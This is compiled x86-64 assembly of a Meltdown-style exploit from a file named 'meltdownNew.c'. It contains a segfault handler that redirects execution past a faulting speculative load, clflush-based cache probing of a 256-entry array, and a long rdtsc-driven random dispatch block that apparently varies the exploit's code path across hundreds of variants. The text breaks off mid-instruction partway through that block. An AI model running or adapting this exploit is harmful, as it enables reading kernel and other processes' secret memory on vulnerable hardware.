	.file	"meltdownNew.c"
	.text
	.type	sigaction_segv, @function
sigaction_segv:
.LFB9:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movl	%edi, -20(%rbp)
	movq	%rsi, -32(%rbp)
	movq	%rdx, -40(%rbp)
	movq	-40(%rbp), %rax
	movq	%rax, -8(%rbp)
	leaq	__speculative_byte_load_exit(%rip), %rdx
	movq	-8(%rbp), %rax
	movq	%rdx, 168(%rax)
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE9:
	.size	sigaction_segv, .-sigaction_segv
	.globl	probe_one
	.type	probe_one, @function
probe_one:
.LFB12:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%rbx
	subq	$2424, %rsp
	.cfi_offset 3, -24
	movq	%rdi, -2408(%rbp)
	movq	%rsi, -2416(%rbp)
	movl	%edx, -2420(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$5, -2376(%rbp)
	movl	$0, -2372(%rbp)
	movl	$0, -2384(%rbp)
	movl	$0, -2380(%rbp)
	movb	$0, -2393(%rbp)
	movq	$0, -2360(%rbp)
	leaq	-288(%rbp), %rax
	movl	$256, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2392(%rbp)
	jmp	.L3
.L13:
	leaq	-2336(%rbp), %rax
	movl	$2048, %edx
	movl	$0, %esi
	movq	%rax, %rdi
	call	memset@PLT
	movl	$0, -2388(%rbp)
	jmp	.L4
.L5:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2352(%rbp)
	movq	-2352(%rbp), %rax
#APP
# 104 "meltdownNew.c" 1
	mfence
	clflush	0(%rax)
# 0 "" 2
#NO_APP
	nop
	addl	$1, -2388(%rbp)
.L4:
	cmpl	$255, -2388(%rbp)
	jle	.L5
	movl	$0, %edx
	movl	$0, %esi
	movl	$-1, %edi
	call	read@PLT
	movq	-2408(%rbp), %rdx
	movq	-2416(%rbp), %rcx
#APP
# 156 "meltdownNew.c" 1
	.global __speculative_byte_load_exit 
	92:                              
	xorq	%rax, %rax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$1000, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lprobe_one_win0_var0
	cmpl	$1, %eax
	je	.Lprobe_one_win0_var1
	cmpl	$2, %eax
	je	.Lprobe_one_win0_var2
	cmpl	$3, %eax
	je	.Lprobe_one_win0_var3
	cmpl	$4, %eax
	je	.Lprobe_one_win0_var4
	cmpl	$5, %eax
	je	.Lprobe_one_win0_var5
	cmpl	$6, %eax
	je	.Lprobe_one_win0_var6
	cmpl	$7, %eax
	je	.Lprobe_one_win0_var7
	cmpl	$8, %eax
	je	.Lprobe_one_win0_var8
	cmpl	$9, %eax
	je	.Lprobe_one_win0_var9
	cmpl	$10, %eax
	je	.Lprobe_one_win0_var10
	cmpl	$11, %eax
	je	.Lprobe_one_win0_var11
	cmpl	$12, %eax
	je	.Lprobe_one_win0_var12
	cmpl	$13, %eax
	je	.Lprobe_one_win0_var13
	cmpl	$14, %eax
	je	.Lprobe_one_win0_var14
	cmpl	$15, %eax
	je	.Lprobe_one_win0_var15
	cmpl	$16, %eax
	je	.Lprobe_one_win0_var16
	cmpl	$17, %eax
	je	.Lprobe_one_win0_var17
	cmpl	$18, %eax
	je	.Lprobe_one_win0_var18
	cmpl	$19, %eax
	je	.Lprobe_one_win0_var19
	cmpl	$20, %eax
	je	.Lprobe_one_win0_var20
	cmpl	$21, %eax
	je	.Lprobe_one_win0_var21
	cmpl	$22, %eax
	je	.Lprobe_one_win0_var22
	cmpl	$23, %eax
	je	.Lprobe_one_win0_var23
	cmpl	$24, %eax
	je	.Lprobe_one_win0_var24
	cmpl	$25, %eax
	je	.Lprobe_one_win0_var25
	cmpl	$26, %eax
	je	.Lprobe_one_win0_var26
	cmpl	$27, %eax
	je	.Lprobe_one_win0_var27
	cmpl	$28, %eax
	je	.Lprobe_one_win0_var28
	cmpl	$29, %eax
	je	.Lprobe_one_win0_var29
	cmpl	$30, %eax
	je	.Lprobe_one_win0_var30
	cmpl	$31, %eax
	je	.Lprobe_one_win0_var31
	cmpl	$32, %eax
	je	.Lprobe_one_win0_var32
	cmpl	$33, %eax
	je	.Lprobe_one_win0_var33
	cmpl	$34, %eax
	je	.Lprobe_one_win0_var34
	cmpl	$35, %eax
	je	.Lprobe_one_win0_var35
	cmpl	$36, %eax
	je	.Lprobe_one_win0_var36
	cmpl	$37, %eax
	je	.Lprobe_one_win0_var37
	cmpl	$38, %eax
	je	.Lprobe_one_win0_var38
	cmpl	$39, %eax
	je	.Lprobe_one_win0_var39
	cmpl	$40, %eax
	je	.Lprobe_one_win0_var40
	cmpl	$41, %eax
	je	.Lprobe_one_win0_var41
	cmpl	$42, %eax
	je	.Lprobe_one_win0_var42
	cmpl	$43, %eax
	je	.Lprobe_one_win0_var43
	cmpl	$44, %eax
	je	.Lprobe_one_win0_var44
	cmpl	$45, %eax
	je	.Lprobe_one_win0_var45
	cmpl	$46, %eax
	je	.Lprobe_one_win0_var46
	cmpl	$47, %eax
	je	.Lprobe_one_win0_var47
	cmpl	$48, %eax
	je	.Lprobe_one_win0_var48
	cmpl	$49, %eax
	je	.Lprobe_one_win0_var49
	cmpl	$50, %eax
	je	.Lprobe_one_win0_var50
	cmpl	$51, %eax
	je	.Lprobe_one_win0_var51
	cmpl	$52, %eax
	je	.Lprobe_one_win0_var52
	cmpl	$53, %eax
	je	.Lprobe_one_win0_var53
	cmpl	$54, %eax
	je	.Lprobe_one_win0_var54
	cmpl	$55, %eax
	je	.Lprobe_one_win0_var55
	cmpl	$56, %eax
	je	.Lprobe_one_win0_var56
	cmpl	$57, %eax
	je	.Lprobe_one_win0_var57
	cmpl	$58, %eax
	je	.Lprobe_one_win0_var58
	cmpl	$59, %eax
	je	.Lprobe_one_win0_var59
	cmpl	$60, %eax
	je	.Lprobe_one_win0_var60
	cmpl	$61, %eax
	je	.Lprobe_one_win0_var61
	cmpl	$62, %eax
	je	.Lprobe_one_win0_var62
	cmpl	$63, %eax
	je	.Lprobe_one_win0_var63
	cmpl	$64, %eax
	je	.Lprobe_one_win0_var64
	cmpl	$65, %eax
	je	.Lprobe_one_win0_var65
	cmpl	$66, %eax
	je	.Lprobe_one_win0_var66
	cmpl	$67, %eax
	je	.Lprobe_one_win0_var67
	cmpl	$68, %eax
	je	.Lprobe_one_win0_var68
	cmpl	$69, %eax
	je	.Lprobe_one_win0_var69
	cmpl	$70, %eax
	je	.Lprobe_one_win0_var70
	cmpl	$71, %eax
	je	.Lprobe_one_win0_var71
	cmpl	$72, %eax
	je	.Lprobe_one_win0_var72
	cmpl	$73, %eax
	je	.Lprobe_one_win0_var73
	cmpl	$74, %eax
	je	.Lprobe_one_win0_var74
	cmpl	$75, %eax
	je	.Lprobe_one_win0_var75
	cmpl	$76, %eax
	je	.Lprobe_one_win0_var76
	cmpl	$77, %eax
	je	.Lprobe_one_win0_var77
	cmpl	$78, %eax
	je	.Lprobe_one_win0_var78
	cmpl	$79, %eax
	je	.Lprobe_one_win0_var79
	cmpl	$80, %eax
	je	.Lprobe_one_win0_var80
	cmpl	$81, %eax
	je	.Lprobe_one_win0_var81
	cmpl	$82, %eax
	je	.Lprobe_one_win0_var82
	cmpl	$83, %eax
	je	.Lprobe_one_win0_var83
	cmpl	$84, %eax
	je	.Lprobe_one_win0_var84
	cmpl	$85, %eax
	je	.Lprobe_one_win0_var85
	cmpl	$86, %eax
	je	.Lprobe_one_win0_var86
	cmpl	$87, %eax
	je	.Lprobe_one_win0_var87
	cmpl	$88, %eax
	je	.Lprobe_one_win0_var88
	cmpl	$89, %eax
	je	.Lprobe_one_win0_var89
	cmpl	$90, %eax
	je	.Lprobe_one_win0_var90
	cmpl	$91, %eax
	je	.Lprobe_one_win0_var91
	cmpl	$92, %eax
	je	.Lprobe_one_win0_var92
	cmpl	$93, %eax
	je	.Lprobe_one_win0_var93
	cmpl	$94, %eax
	je	.Lprobe_one_win0_var94
	cmpl	$95, %eax
	je	.Lprobe_one_win0_var95
	cmpl	$96, %eax
	je	.Lprobe_one_win0_var96
	cmpl	$97, %eax
	je	.Lprobe_one_win0_var97
	cmpl	$98, %eax
	je	.Lprobe_one_win0_var98
	cmpl	$99, %eax
	je	.Lprobe_one_win0_var99
	cmpl	$100, %eax
	je	.Lprobe_one_win0_var100
	cmpl	$101, %eax
	je	.Lprobe_one_win0_var101
	cmpl	$102, %eax
	je	.Lprobe_one_win0_var102
	cmpl	$103, %eax
	je	.Lprobe_one_win0_var103
	cmpl	$104, %eax
	je	.Lprobe_one_win0_var104
	cmpl	$105, %eax
	je	.Lprobe_one_win0_var105
	cmpl	$106, %eax
	je	.Lprobe_one_win0_var106
	cmpl	$107, %eax
	je	.Lprobe_one_win0_var107
	cmpl	$108, %eax
	je	.Lprobe_one_win0_var108
	cmpl	$109, %eax
	je	.Lprobe_one_win0_var109
	cmpl	$110, %eax
	je	.Lprobe_one_win0_var110
	cmpl	$111, %eax
	je	.Lprobe_one_win0_var111
	cmpl	$112, %eax
	je	.Lprobe_one_win0_var112
	cmpl	$113, %eax
	je	.Lprobe_one_win0_var113
	cmpl	$114, %eax
	je	.Lprobe_one_win0_var114
	cmpl	$115, %eax
	je	.Lprobe_one_win0_var115
	cmpl	$116, %eax
	je	.Lprobe_one_win0_var116
	cmpl	$117, %eax
	je	.Lprobe_one_win0_var117
	cmpl	$118, %eax
	je	.Lprobe_one_win0_var118
	cmpl	$119, %eax
	je	.Lprobe_one_win0_var119
	cmpl	$120, %eax
	je	.Lprobe_one_win0_var120
	cmpl	$121, %eax
	je	.Lprobe_one_win0_var121
	cmpl	$122, %eax
	je	.Lprobe_one_win0_var122
	cmpl	$123, %eax
	je	.Lprobe_one_win0_var123
	cmpl	$124, %eax
	je	.Lprobe_one_win0_var124
	cmpl	$125, %eax
	je	.Lprobe_one_win0_var125
	cmpl	$126, %eax
	je	.Lprobe_one_win0_var126
	cmpl	$127, %eax
	je	.Lprobe_one_win0_var127
	cmpl	$128, %eax
	je	.Lprobe_one_win0_var128
	cmpl	$129, %eax
	je	.Lprobe_one_win0_var129
	cmpl	$130, %eax
	je	.Lprobe_one_win0_var130
	cmpl	$131, %eax
	je	.Lprobe_one_win0_var131
	cmpl	$132, %eax
	je	.Lprobe_one_win0_var132
	cmpl	$133, %eax
	je	.Lprobe_one_win0_var133
	cmpl	$134, %eax
	je	.Lprobe_one_win0_var134
	cmpl	$135, %eax
	je	.Lprobe_one_win0_var135
	cmpl	$136, %eax
	je	.Lprobe_one_win0_var136
	cmpl	$137, %eax
	je	.Lprobe_one_win0_var137
	cmpl	$138, %eax
	je	.Lprobe_one_win0_var138
	cmpl	$139, %eax
	je	.Lprobe_one_win0_var139
	cmpl	$140, %eax
	je	.Lprobe_one_win0_var140
	cmpl	$141, %eax
	je	.Lprobe_one_win0_var141
	cmpl	$142, %eax
	je	.Lprobe_one_win0_var142
	cmpl	$143, %eax
	je	.Lprobe_one_win0_var143
	cmpl	$144, %eax
	je	.Lprobe_one_win0_var144
	cmpl	$145, %eax
	je	.Lprobe_one_win0_var145
	cmpl	$146, %eax
	je	.Lprobe_one_win0_var146
	cmpl	$147, %eax
	je	.Lprobe_one_win0_var147
	cmpl	$148, %eax
	je	.Lprobe_one_win0_var148
	cmpl	$149, %eax
	je	.Lprobe_one_win0_var149
	cmpl	$150, %eax
	je	.Lprobe_one_win0_var150
	cmpl	$151, %eax
	je	.Lprobe_one_win0_var151
	cmpl	$152, %eax
	je	.Lprobe_one_win0_var152
	cmpl	$153, %eax
	je	.Lprobe_one_win0_var153
	cmpl	$154, %eax
	je	.Lprobe_one_win0_var154
	cmpl	$155, %eax
	je	.Lprobe_one_win0_var155
	cmpl	$156, %eax
	je	.Lprobe_one_win0_var156
	cmpl	$157, %eax
	je	.Lprobe_one_win0_var157
	cmpl	$158, %eax
	je	.Lprobe_one_win0_var158
	cmpl	$159, %eax
	je	.Lprobe_one_win0_var159
	cmpl	$160, %eax
	je	.Lprobe_one_win0_var160
	cmpl	$161, %eax
	je	.Lprobe_one_win0_var161
	cmpl	$162, %eax
	je	.Lprobe_one_win0_var162
	cmpl	$163, %eax
	je	.Lprobe_one_win0_var163
	cmpl	$164, %eax
	je	.Lprobe_one_win0_var164
	cmpl	$165, %eax
	je	.Lprobe_one_win0_var165
	cmpl	$166, %eax
	je	.Lprobe_one_win0_var166
	cmpl	$167, %eax
	je	.Lprobe_one_win0_var167
	cmpl	$168, %eax
	je	.Lprobe_one_win0_var168
	cmpl	$169, %eax
	je	.Lprobe_one_win0_var169
	cmpl	$170, %eax
	je	.Lprobe_one_win0_var170
	cmpl	$171, %eax
	je	.Lprobe_one_win0_var171
	cmpl	$172, %eax
	je	.Lprobe_one_win0_var172
	cmpl	$173, %eax
	je	.Lprobe_one_win0_var173
	cmpl	$174, %eax
	je	.Lprobe_one_win0_var174
	cmpl	$175, %eax
	je	.Lprobe_one_win0_var175
	cmpl	$176, %eax
	je	.Lprobe_one_win0_var176
	cmpl	$177, %eax
	je	.Lprobe_one_win0_var177
	cmpl	$178, %eax
	je	.Lprobe_one_win0_var178
	cmpl	$179, %eax
	je	.Lprobe_one_win0_var179
	cmpl	$180, %eax
	je	.Lprobe_one_win0_var180
	cmpl	$181, %eax
	je	.Lprobe_one_win0_var181
	cmpl	$182, %eax
	je	.Lprobe_one_win0_var182
	cmpl	$183, %eax
	je	.Lprobe_one_win0_var183
	cmpl	$184, %eax
	je	.Lprobe_one_win0_var184
	cmpl	$185, %eax
	je	.Lprobe_one_win0_var185
	cmpl	$186, %eax
	je	.Lprobe_one_win0_var186
	cmpl	$187, %eax
	je	.Lprobe_one_win0_var187
	cmpl	$188, %eax
	je	.Lprobe_one_win0_var188
	cmpl	$189, %eax
	je	.Lprobe_one_win0_var189
	cmpl	$190, %eax
	je	.Lprobe_one_win0_var190
	cmpl	$191, %eax
	je	.Lprobe_one_win0_var191
	cmpl	$192, %eax
	je	.Lprobe_one_win0_var192
	cmpl	$193, %eax
	je	.Lprobe_one_win0_var193
	cmpl	$194, %eax
	je	.Lprobe_one_win0_var194
	cmpl	$195, %eax
	je	.Lprobe_one_win0_var195
	cmpl	$196, %eax
	je	.Lprobe_one_win0_var196
	cmpl	$197, %eax
	je	.Lprobe_one_win0_var197
	cmpl	$198, %eax
	je	.Lprobe_one_win0_var198
	cmpl	$199, %eax
	je	.Lprobe_one_win0_var199
	cmpl	$200, %eax
	je	.Lprobe_one_win0_var200
	cmpl	$201, %eax
	je	.Lprobe_one_win0_var201
	cmpl	$202, %eax
	je	.Lprobe_one_win0_var202
	cmpl	$203, %eax
	je	.Lprobe_one_win0_var203
	cmpl	$204, %eax
	je	.Lprobe_one_win0_var204
	cmpl	$205, %eax
	je	.Lprobe_one_win0_var205
	cmpl	$206, %eax
	je	.Lprobe_one_win0_var206
	cmpl	$207, %eax
	je	.Lprobe_one_win0_var207
	cmpl	$208, %eax
	je	.Lprobe_one_win0_var208
	cmpl	$209, %eax
	je	.Lprobe_one_win0_var209
	cmpl	$210, %eax
	je	.Lprobe_one_win0_var210
	cmpl	$211, %eax
	je	.Lprobe_one_win0_var211
	cmpl	$212, %eax
	je	.Lprobe_one_win0_var212
	cmpl	$213, %eax
	je	.Lprobe_one_win0_var213
	cmpl	$214, %eax
	je	.Lprobe_one_win0_var214
	cmpl	$215, %eax
	je	.Lprobe_one_win0_var215
	cmpl	$216, %eax
	je	.Lprobe_one_win0_var216
	cmpl	$217, %eax
	je	.Lprobe_one_win0_var217
	cmpl	$218, %eax
	je	.Lprobe_one_win0_var218
	cmpl	$219, %eax
	je	.Lprobe_one_win0_var219
	cmpl	$220, %eax
	je	.Lprobe_one_win0_var220
	cmpl	$221, %eax
	je	.Lprobe_one_win0_var221
	cmpl	$222, %eax
	je	.Lprobe_one_win0_var222
	cmpl	$223, %eax
	je	.Lprobe_one_win0_var223
	cmpl	$224, %eax
	je	.Lprobe_one_win0_var224
	cmpl	$225, %eax
	je	.Lprobe_one_win0_var225
	cmpl	$226, %eax
	je	.Lprobe_one_win0_var226
	cmpl	$227, %eax
	je	.Lprobe_one_win0_var227
	cmpl	$228, %eax
	je	.Lprobe_one_win0_var228
	cmpl	$229, %eax
	je	.Lprobe_one_win0_var229
	cmpl	$230, %eax
	je	.Lprobe_one_win0_var230
	cmpl	$231, %eax
	je	.Lprobe_one_win0_var231
	cmpl	$232, %eax
	je	.Lprobe_one_win0_var232
	cmpl	$233, %eax
	je	.Lprobe_one_win0_var233
	cmpl	$234, %eax
	je	.Lprobe_one_win0_var234
	cmpl	$235, %eax
	je	.Lprobe_one_win0_var235
	cmpl	$236, %eax
	je	.Lprobe_one_win0_var236
	cmpl	$237, %eax
	je	.Lprobe_one_win0_var237
	cmpl	$238, %eax
	je	.Lprobe_one_win0_var238
	cmpl	$239, %eax
	je	.Lprobe_one_win0_var239
	cmpl	$240, %eax
	je	.Lprobe_one_win0_var240
	cmpl	$241, %eax
	je	.Lprobe_one_win0_var241
	cmpl	$242, %eax
	je	.Lprobe_one_win0_var242
	cmpl	$243, %eax
	je	.Lprobe_one_win0_var243
	cmpl	$244, %eax
	je	.Lprobe_one_win0_var244
	cmpl	$245, %eax
	je	.Lprobe_one_win0_var245
	cmpl	$246, %eax
	je	.Lprobe_one_win0_var246
	cmpl	$247, %eax
	je	.Lprobe_one_win0_var247
	cmpl	$248, %eax
	je	.Lprobe_one_win0_var248
	cmpl	$249, %eax
	je	.Lprobe_one_win0_var249
	cmpl	$250, %eax
	je	.Lprobe_one_win0_var250
	cmpl	$251, %eax
	je	.Lprobe_one_win0_var251
	cmpl	$252, %eax
	je	.Lprobe_one_win0_var252
	cmpl	$253, %eax
	je	.Lprobe_one_win0_var253
	cmpl	$254, %eax
	je	.Lprobe_one_win0_var254
	cmpl	$255, %eax
	je	.Lprobe_one_win0_var255
	cmpl	$256, %eax
	je	.Lprobe_one_win0_var256
	cmpl	$257, %eax
	je	.Lprobe_one_win0_var257
	cmpl	$258, %eax
	je	.Lprobe_one_win0_var258
	cmpl	$259, %eax
	je	.Lprobe_one_win0_var259
	cmpl	$260, %eax
	je	.Lprobe_one_win0_var260
	cmpl	$261, %eax
	je	.Lprobe_one_win0_var261
	cmpl	$262, %eax
	je	.Lprobe_one_win0_var262
	cmpl	$263, %eax
	je	.Lprobe_one_win0_var263
	cmpl	$264, %eax
	je	.Lprobe_one_win0_var264
	cmpl	$265, %eax
	je	.Lprobe_one_win0_var265
	cmpl	$266, %eax
	je	.Lprobe_one_win0_var266
	cmpl	$267, %eax
	je	.Lprobe_one_win0_var267
	cmpl	$268, %eax
	je	.Lprobe_one_win0_var268
	cmpl	$269, %eax
	je	.Lprobe_one_win0_var269
	cmpl	$270, %eax
	je	.Lprobe_one_win0_var270
	cmpl	$271, %eax
	je	.Lprobe_one_win0_var271
	cmpl	$272, %eax
	je	.Lprobe_one_win0_var272
	cmpl	$273, %eax
	je	.Lprobe_one_win0_var273
	cmpl	$274, %eax
	je	.Lprobe_one_win0_var274
	cmpl	$275, %eax
	je	.Lprobe_one_win0_var275
	cmpl	$276, %eax
	je	.Lprobe_one_win0_var276
	cmpl	$277, %eax
	je	.Lprobe_one_win0_var277
	cmpl	$278, %eax
	je	.Lprobe_one_win0_var278
	cmpl	$279, %eax
	je	.Lprobe_one_win0_var279
	cmpl	$280, %eax
	je	.Lprobe_one_win0_var280
	cmpl	$281, %eax
	je	.Lprobe_one_win0_var281
	cmpl	$282, %eax
	je	.Lprobe_one_win0_var282
	cmpl	$283, %eax
	je	.Lprobe_one_win0_var283
	cmpl	$284, %eax
	je	.Lprobe_one_win0_var284
	cmpl	$285, %eax
	je	.Lprobe_one_win0_var285
	cmpl	$286, %eax
	je	.Lprobe_one_win0_var286
	cmpl	$287, %eax
	je	.Lprobe_one_win0_var287
	cmpl	$288, %eax
	je	.Lprobe_one_win0_var288
	cmpl	$289, %eax
	je	.Lprobe_one_win0_var289
	cmpl	$290, %eax
	je	.Lprobe_one_win0_var290
	cmpl	$291, %eax
	je	.Lprobe_one_win0_var291
	cmpl	$292, %eax
	je	.Lprobe_one_win0_var292
	cmpl	$293, %eax
	je	.Lprobe_one_win0_var293
	cmpl	$294, %eax
	je	.Lprobe_one_win0_var294
	cmpl	$295, %eax
	je	.Lprobe_one_win0_var295
	cmpl	$296, %eax
	je	.Lprobe_one_win0_var296
	cmpl	$297, %eax
	je	.Lprobe_one_win0_var297
	cmpl	$298, %eax
	je	.Lprobe_one_win0_var298
	cmpl	$299, %eax
	je	.Lprobe_one_win0_var299
	cmpl	$300, %eax
	je	.Lprobe_one_win0_var300
	cmpl	$301, %eax
	je	.Lprobe_one_win0_var301
	cmpl	$302, %eax
	je	.Lprobe_one_win0_var302
	cmpl	$303, %eax
	je	.Lprobe_one_win0_var303
	cmpl	$304, %eax
	je	.Lprobe_one_win0_var304
	cmpl	$305, %eax
	je	.Lprobe_one_win0_var305
	cmpl	$306, %eax
	je	.Lprobe_one_win0_var306
	cmpl	$307, %eax
	je	.Lprobe_one_win0_var307
	cmpl	$308, %eax
	je	.Lprobe_one_win0_var308
	cmpl	$309, %eax
	je	.Lprobe_one_win0_var309
	cmpl	$310, %eax
	je	.Lprobe_one_win0_var310
	cmpl	$311, %eax
	je	.Lprobe_one_win0_var311
	cmpl	$312, %eax
	je	.Lprobe_one_win0_var312
	cmpl	$313, %eax
	je	.Lprobe_one_win0_var313
	cmpl	$314, %eax
	je	.Lprobe_one_win0_var314
	cmpl	$315, %eax
	je	.Lprobe_one_win0_var315
	cmpl	$316, %eax
	je	.Lprobe_one_win0_var316
	cmpl	$317, %eax
	je	.Lprobe_one_win0_var317
	cmpl	$318, %eax
	je	.Lprobe_one_win0_var318
	cmpl	$319, %eax
	je	.Lprobe_one_win0_var319
	cmpl	$320, %eax
	je	.Lprobe_one_win0_var320
	cmpl	$321, %eax
	je	.Lprobe_one_win0_var321
	cmpl	$322, %eax
	je	.Lprobe_one_win0_var322
	cmpl	$323, %eax
	je	.Lprobe_one_win0_var323
	cmpl	$324, %eax
	je	.Lprobe_one_win0_var324
	cmpl	$325, %eax
	je	.Lprobe_one_win0_var325
	cmpl	$326, %eax
	je	.Lprobe_one_win0_var326
	cmpl	$327, %eax
	je	.Lprobe_one_win0_var327
	cmpl	$328, %eax
	je	.Lprobe_one_win0_var328
	cmpl	$329, %eax
	je	.Lprobe_one_win0_var329
	cmpl	$330, %eax
	je	.Lprobe_one_win0_var330
	cmpl	$331, %eax
	je	.Lprobe_one_win0_var331
	cmpl	$332, %eax
	je	.Lprobe_one_win0_var332
	cmpl	$333, %eax
	je	.Lprobe_one_win0_var333
	cmpl	$334, %eax
	je	.Lprobe_one_win0_var334
	cmpl	$335, %eax
	je	.Lprobe_one_win0_var335
	cmpl	$336, %eax
	je	.Lprobe_one_win0_var336
	cmpl	$337, %eax
	je	.Lprobe_one_win0_var337
	cmpl	$338, %eax
	je	.Lprobe_one_win0_var338
	cmpl	$339, %eax
	je	.Lprobe_one_win0_var339
	cmpl	$340, %eax
	je	.Lprobe_one_win0_var340
	cmpl	$341, %eax
	je	.Lprobe_one_win0_var341
	cmpl	$342, %eax
	je	.Lprobe_one_win0_var342
	cmpl	$343, %eax
	je	.Lprobe_one_win0_var343
	cmpl	$344, %eax
	je	.Lprobe_one_win0_var344
	cmpl	$345, %eax
	je	.Lprobe_one_win0_var345
	cmpl	$346, %eax
	je	.Lprobe_one_win0_var346
	cmpl	$347, %eax
	je	.Lprobe_one_win0_var347
	cmpl	$348, %eax
	je	.Lprobe_one_win0_var348
	cmpl	$349, %eax
	je	.Lprobe_one_win0_var349
	cmpl	$350, %eax
	je	.Lprobe_one_win0_var350
	cmpl	$351, %eax
	je	.Lprobe_one_win0_var351
	cmpl	$352, %eax
	je	.Lprobe_one_win0_var352
	cmpl	$353, %eax
	je	.Lprobe_one_win0_var353
	cmpl	$354, %eax
	je	.Lprobe_one_win0_var354
	cmpl	$355, %eax
	je	.Lprobe_one_win0_var355
	cmpl	$356, %eax
	je	.Lprobe_one_win0_var356
	cmpl	$357, %eax
	je	.Lprobe_one_win0_var357
	cmpl	$358, %eax
	je	.Lprobe_one_win0_var358
	cmpl	$359, %eax
	je	.Lprobe_one_win0_var359
	cmpl	$360, %eax
	je	.Lprobe_one_win0_var360
	cmpl	$361, %eax
	je	.Lprobe_one_win0_var361
	cmpl	$362, %eax
	je	.Lprobe_one_win0_var362
	cmpl	$363, %eax
	je	.Lprobe_one_win0_var363
	cmpl	$364, %eax
	je	.Lprobe_one_win0_var364
	cmpl	$365, %eax
	je	.Lprobe_one_win0_var365
	cmpl	$366, %eax
	je	.Lprobe_one_win0_var366
	cmpl	$367, %eax
	je	.Lprobe_one_win0_var367
	cmpl	$368, %eax
	je	.Lprobe_one_win0_var368
	cmpl	$369, %eax
	je	.Lprobe_one_win0_var369
	cmpl	$370, %eax
	je	.Lprobe_one_win0_var370
	cmpl	$371, %eax
	je	.Lprobe_one_win0_var371
	cmpl	$372, %eax
	je	.Lprobe_one_win0_var372
	cmpl	$373, %eax
	je	.Lprobe_one_win0_var373
	cmpl	$374, %eax
	je	.Lprobe_one_win0_var374
	cmpl	$375, %eax
	je	.Lprobe_one_win0_var375
	cmpl	$376, %eax
	je	.Lprobe_one_win0_var376
	cmpl	$377, %eax
	je	.Lprobe_one_win0_var377
	cmpl	$378, %eax
	je	.Lprobe_one_win0_var378
	cmpl	$379, %eax
	je	.Lprobe_one_win0_var379
	cmpl	$380, %eax
	je	.Lprobe_one_win0_var380
	cmpl	$381, %eax
	je	.Lprobe_one_win0_var381
	cmpl	$382, %eax
	je	.Lprobe_one_win0_var382
	cmpl	$383, %eax
	je	.Lprobe_one_win0_var383
	cmpl	$384, %eax
	je	.Lprobe_one_win0_var384
	cmpl	$385, %eax
	je	.Lprobe_one_win0_var385
	cmpl	$386, %eax
	je	.Lprobe_one_win0_var386
	cmpl	$387, %eax
	je	.Lprobe_one_win0_var387
	cmpl	$388, %eax
	je	.Lprobe_one_win0_var388
	cmpl	$389, %eax
	je	.Lprobe_one_win0_var389
	cmpl	$390, %eax
	je	.Lprobe_one_win0_var390
	cmpl	$391, %eax
	je	.Lprobe_one_win0_var391
	cmpl	$392, %eax
	je	.Lprobe_one_win0_var392
	cmpl	$393, %eax
	je	.Lprobe_one_win0_var393
	cmpl	$394, %eax
	je	.Lprobe_one_win0_var394
	cmpl	$395, %eax
	je	.Lprobe_one_win0_var395
	cmpl	$396, %eax
	je	.Lprobe_one_win0_var396
	cmpl	$397, %eax
	je	.Lprobe_one_win0_var397
	cmpl	$398, %eax
	je	.Lprobe_one_win0_var398
	cmpl	$399, %eax
	je	.Lprobe_one_win0_var399
	cmpl	$400, %eax
	je	.Lprobe_one_win0_var400
	cmpl	$401, %eax
	je	.Lprobe_one_win0_var401
	cmpl	$402, %eax
	je	.Lprobe_one_win0_var402
	cmpl	$403, %eax
	je	.Lprobe_one_win0_var403
	cmpl	$404, %eax
	je	.Lprobe_one_win0_var404
	cmpl	$405, %eax
	je	.Lprobe_one_win0_var405
	cmpl	$406, %eax
	je	.Lprobe_one_win0_var406
	cmpl	$407, %eax
	je	.Lprobe_one_win0_var407
	cmpl	$408, %eax
	je	.Lprobe_one_win0_var408
	cmpl	$409, %eax
	je	.Lprobe_one_win0_var409
	cmpl	$410, %eax
	je	.Lprobe_one_win0_var410
	cmpl	$411, %eax
	je	.Lprobe_one_win0_var411
	cmpl	$412, %eax
	je	.Lprobe_one_win0_var412
	cmpl	$413, %eax
	je	.Lprobe_one_win0_var413
	cmpl	$414, %eax
	je	.Lprobe_one_win0_var414
	cmpl	$415, %eax
	je	.Lprobe_one_win0_var415
	cmpl	$416, %eax
	je	.Lprobe_one_win0_var416
	cmpl	$417, %eax
	je	.Lprobe_one_win0_var417
	cmpl	$418, %eax
	je	.Lprobe_one_win0_var418
	cmpl	$419, %eax
	je	.Lprobe_one_win0_var419
	cmpl	$420, %eax
	je	.Lprobe_one_win0_var420
	cmpl	$421, %eax
	je	.Lprobe_one_win0_var421
	cmpl	$422, %eax
	je	.Lprobe_one_win0_var422
	cmpl	$423, %eax
	je	.Lprobe_one_win0_var423
	cmpl	$424, %eax
	je	.Lprobe_one_win0_var424
	cmpl	$425, %eax
	je	.Lprobe_one_win0_var425
	cmpl	$426, %eax
	je	.Lprobe_one_win0_var426
	cmpl	$427, %eax
	je	.Lprobe_one_win0_var427
	cmpl	$428, %eax
	je	.Lprobe_one_win0_var428
	cmpl	$429, %eax
	je	.Lprobe_one_win0_var429
	cmpl	$430, %eax
	je	.Lprobe_one_win0_var430
	cmpl	$431, %eax
	je	.Lprobe_one_win0_var431
	cmpl	$432, %eax
	je	.Lprobe_one_win0_var432
	cmpl	$433, %eax
	je	.Lprobe_one_win0_var433
	cmpl	$434, %eax
	je	.Lprobe_one_win0_var434
	cmpl	$435, %eax
	je	.Lprobe_one_win0_var435
	cmpl	$436, %eax
	je	.Lprobe_one_win0_var436
	cmpl	$437, %eax
	je	.Lprobe_one_win0_var437
	cmpl	$438, %eax
